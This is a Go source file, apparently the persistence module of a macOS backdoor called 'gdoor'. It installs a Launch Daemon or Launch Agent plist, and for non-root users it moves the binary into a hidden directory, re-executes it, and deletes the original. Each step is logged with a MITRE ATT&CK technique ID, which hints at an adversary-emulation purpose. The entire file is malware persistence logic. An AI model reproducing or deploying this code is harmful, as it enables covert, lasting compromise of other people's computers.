package persist

import (
	"os"
	"path/filepath"

	"gdoor/config"
	"gdoor/debug"
	"gdoor/info"
)

func CheckAndExec(i *info.Info) {
	if i.GetCurUser() == "root" {
		if len(os.Args) == 2 && os.Args[1] == "1" {
			setPlist(i)
			debug.Log("T1160", "", "", "Launch Daemon")
			execTarget(i)
			debug.Log("T1059", "", "", "Command-Line Interface")
			os.Exit(0)
		}
	} else {
		if i.GetCurPath() != filepath.Join(i.GetHomePath(), config.TargetDir, config.TargetName) {
			setPlist(i)
			debug.Log("T1159", "", "", "Launch Agent")
			moveToTarget(i)
			debug.Log("T1158", "", "", "Hidden Files and Directories")
			execTarget(i)
			debug.Log("T1059", "", "", "Command-Line Interface")
			os.Remove(i.GetCurPath())
			os.Exit(0)
		}
	}
}
